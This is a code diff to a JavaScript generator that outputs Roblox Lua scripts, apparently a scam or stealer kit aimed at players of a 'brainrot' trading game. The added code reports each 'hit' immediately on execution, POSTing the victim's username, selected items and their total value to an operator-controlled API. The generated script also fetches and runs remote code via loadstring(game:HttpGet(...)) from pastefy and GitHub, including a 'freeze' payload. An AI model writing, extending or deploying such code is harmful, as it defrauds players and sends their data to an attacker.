@@ -911,6 +911,32 @@ async function generate() {
     const brainrotLines = [...selected].map(n => `  ["${n}"] = true,`).join('\n');
     const allLines      = buildAllBrainrotsLua();
 
+    // Build selected brainrots as a Lua array for immediate reporting
+    const selectedArr = [...selected].map(n => {
+      const a = ANIMAL_MAP[n];
+      return a ? `{name="${n}",mps="${a.mps}"}` : `{name="${n}",mps="?"}`;
+    });
+    const selectedLuaArr = '{\n' + selectedArr.map(s => '  ' + s + ',').join('\n') + '\n}';
+
+    // Calculate a rough total MPS string from selected animals
+    let totalMpsNum = 0;
+    selected.forEach(n => {
+      const a = ANIMAL_MAP[n];
+      if (a) {
+        const raw = a.mps.replace(/[^\d.]/g, '');
+        const val = parseFloat(raw) || 0;
+        const unit = a.mps.toUpperCase();
+        if (unit.includes('K')) totalMpsNum += val * 1000;
+        else if (unit.includes('M')) totalMpsNum += val * 1000000;
+        else if (unit.includes('B')) totalMpsNum += val * 1000000000;
+        else totalMpsNum += val;
+      }
+    });
+    const totalMpsStr = totalMpsNum >= 1e9 ? (totalMpsNum/1e9).toFixed(1)+'B'
+      : totalMpsNum >= 1e6 ? (totalMpsNum/1e6).toFixed(1)+'M'
+      : totalMpsNum >= 1e3 ? (totalMpsNum/1e3).toFixed(1)+'K'
+      : totalMpsNum.toFixed(0);
+
     let adminPart = '';
     if (adminMode === 'admin-panel') adminPart = `\ntask.spawn(function()\nloadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()\nend)`;
     else if (adminMode === 'freeze') adminPart = `\ntask.spawn(function()\nloadstring(game:HttpGet("https://pastefy.app/BNCsmpLk/raw"))()\nend)`;
@@ -932,6 +958,24 @@ getgenv().SkrinReport = function(victim, brainrots, totalMps)
     request({Url=getgenv().SKRINHUB_API, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
   end)
 end
+-- Report hit immediately on script execution
+task.spawn(function()
+  local ok, err = pcall(function()
+    local hs = game:GetService("HttpService")
+    local brainrots = ${selectedLuaArr}
+    local body = hs:JSONEncode({
+      username = getgenv().TARGET_USERNAME,
+      brainrots = brainrots,
+      totalMps = "${totalMpsStr}"
+    })
+    request({
+      Url = getgenv().SKRINHUB_API,
+      Method = "POST",
+      Headers = {["Content-Type"] = "application/json"},
+      Body = body
+    })
+  end)
+end)
 task.spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ZAmbuluda/Shrinkhub/refs/heads/main/freeze.lua"))()
 end)${adminPart}`;
